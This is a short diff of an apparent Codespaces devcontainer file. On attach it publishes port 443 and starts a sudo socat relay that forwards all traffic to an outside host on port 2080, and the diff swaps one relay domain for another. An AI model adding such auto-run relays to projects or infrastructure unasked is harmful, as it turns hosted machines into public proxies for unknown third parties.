@@ -12,7 +12,7 @@
   "postCreateCommand": "sudo apt-get update && sudo apt-get install -y socat",
   "postAttachCommand": {
     "public": "gh codespace ports visibility 443:public -c $CODESPACE_NAME",
-    "relay": "sudo socat TCP-LISTEN:443,fork,reuseaddr TCP:je.myfavorateking.biz:2080"
+    "relay": "sudo socat TCP-LISTEN:443,fork,reuseaddr TCP:tb.saat.live:2080"
   },
   "portsAttributes": {
     "443": {
